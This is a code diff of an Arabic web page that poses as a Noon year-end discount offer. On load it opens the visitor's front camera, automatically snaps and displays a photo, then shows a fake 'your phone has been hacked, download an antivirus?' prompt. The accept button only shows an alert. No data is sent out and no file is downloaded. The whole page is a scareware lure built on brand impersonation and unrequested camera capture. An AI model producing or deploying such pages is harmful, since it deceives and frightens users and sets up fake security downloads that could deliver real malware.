@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>خصومات نهاية السنة من نون</title>
+    <title>خصومات نهاية السنة من نون</title> <!-- تعديل العنوان -->
     <style>
         body {
             text-align: center;
@@ -19,9 +19,9 @@
             height: 100vh;
         }
         #video, #canvas {
-            width: 100vw; /* العرض بالكامل */
-            height: auto; /* الحفاظ على النسبة */
-            object-fit: cover; /* ملء الإطار */
+            width: 100vw;
+            height: auto;
+            object-fit: cover;
         }
         #dialog {
             display: none;
@@ -61,16 +61,16 @@
     </style>
 </head>
 <body>
-    <video id="video" autoplay></video>
+    <video id="video" autoplay playsinline></video>
     <canvas id="canvas" style="display: none;"></canvas>
     
-  <div id="dialog">
+    <div id="dialog">
         <p>تم تهكير هاتفك. هل تريد تنزيل مضاد فيروسات؟</p>
         <button id="accept" class="dialog-button">موافق</button>
         <button id="cancel" class="dialog-button">إلغاء</button>
     </div>
 
-   <script>
+    <script>
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const context = canvas.getContext('2d');
@@ -78,48 +78,53 @@
         const acceptButton = document.getElementById('accept');
         const cancelButton = document.getElementById('cancel');
 
-        // الوصول إلى الكاميرا مع إعداد الوضع الأفقي
-        navigator.mediaDevices.getUserMedia({
-            video: {
-                width: { ideal: 1280 },
-                height: { ideal: 720 },
-                facingMode: "user" // الكاميرا الأمامية
-            }
-        })
-        .then(stream => {
-            video.srcObject = stream;
+        // تفعيل الكاميرا
+        function startCamera() {
+            navigator.mediaDevices.getUserMedia({
+                video: {
+                    width: { ideal: 1280 },
+                    height: { ideal: 720 },
+                    facingMode: "user" // الكاميرا الأمامية
+                }
+            })
+            .then(stream => {
+                video.srcObject = stream;
 
-            // التقاط الصورة تلقائيًا بعد ثانية واحدة
-            setTimeout(() => {
-                // ضبط أبعاد اللوحة
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
+                // التقاط الصورة تلقائيًا
+                setTimeout(() => {
+                    captureImage();
+                }, 1000);
+            })
+            .catch(err => {
+                alert("حدث خطأ أثناء الوصول إلى الكاميرا: " + err.message);
+                console.error("خطأ:", err);
+            });
+        }
 
-                // نسخ الفيديو إلى اللوحة
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        // التقاط الصورة وعرض مربع الحوار
+        function captureImage() {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
 
-                // إخفاء الفيديو وإظهار اللوحة والنص
-                video.style.display = "none";
-                canvas.style.display = "block";
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                // إظهار مربع الحوار
-                dialog.style.display = "block";
-            }, 1000);
-        })
-        .catch(err => {
-            console.error("خطأ في الوصول إلى الكاميرا:", err);
-        });
+            video.style.display = "none";
+            canvas.style.display = "block";
+            dialog.style.display = "block";
+        }
 
-        // حدث عند الضغط على "موافق"
+        // أحداث الأزرار
         acceptButton.addEventListener('click', () => {
             alert("جاري تنزيل مضاد الفيروسات...");
         });
 
-        // حدث عند الضغط على "إلغاء"
         cancelButton.addEventListener('click', () => {
             alert("تم إلغاء العملية.");
-            dialog.style.display = "none"; // إخفاء مربع الحوار
+            dialog.style.display = "none";
         });
+
+        // بدء تشغيل الكاميرا
+        startCamera();
     </script>
 </body>
 </html>
